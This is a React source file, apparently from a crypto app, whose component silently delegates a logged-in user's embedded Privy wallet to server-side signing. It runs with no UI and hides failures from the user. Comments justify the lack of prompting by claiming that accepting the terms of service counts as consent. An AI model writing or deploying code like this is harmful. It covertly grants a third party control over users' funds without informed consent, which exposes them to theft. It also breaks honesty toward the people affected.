'use client';

import { useEffect, useRef } from 'react';
import { usePrivy, useWallets } from '@privy-io/react-auth';

/**
 * GanSignerSetup - Silently auto-delegates wallet on login
 * No UI - happens automatically in background
 * User consent is covered by ToS acceptance
 */
export default function GanSignerSetup() {
  const { ready, authenticated } = usePrivy();
  const { wallets } = useWallets();
  const attemptedRef = useRef(false);

  const embeddedWallet = wallets?.find(w => w.walletClientType === 'privy');

  useEffect(() => {
    if (!ready || !authenticated || !embeddedWallet) return;
    if (attemptedRef.current) return;
    
    // Already delegated - nothing to do
    if (embeddedWallet.delegated) {
      console.log('[GAN] Wallet already delegated ✅');
      return;
    }
    
    attemptedRef.current = true;
    
    // Auto-delegate silently
    (async () => {
      console.log('[GAN] Auto-delegating wallet...');
      console.log('[GAN] Wallet address:', embeddedWallet.address);
      console.log('[GAN] Wallet methods:', Object.getOwnPropertyNames(Object.getPrototypeOf(embeddedWallet)));
      
      try {
        // Try delegate() method
        if (typeof embeddedWallet.delegate === 'function') {
          console.log('[GAN] Calling delegate()...');
          await embeddedWallet.delegate();
          console.log('[GAN] Delegation successful ✅');
          return;
        }
        
        // Try setDelegation() method
        if (typeof embeddedWallet.setDelegation === 'function') {
          console.log('[GAN] Calling setDelegation()...');
          await embeddedWallet.setDelegation({ enabled: true });
          console.log('[GAN] Delegation successful ✅');
          return;
        }
        
        // Log available methods for debugging
        console.log('[GAN] No delegation method found. Available properties:', 
          Object.keys(embeddedWallet).join(', ')
        );
        
      } catch (err) {
        // Silent failure - don't show error to user
        console.log('[GAN] Auto-delegation failed:', err.message);
        // Reset so we can retry on next mount
        attemptedRef.current = false;
      }
    })();
  }, [ready, authenticated, embeddedWallet]);

  // No UI - completely invisible
  return null;
}
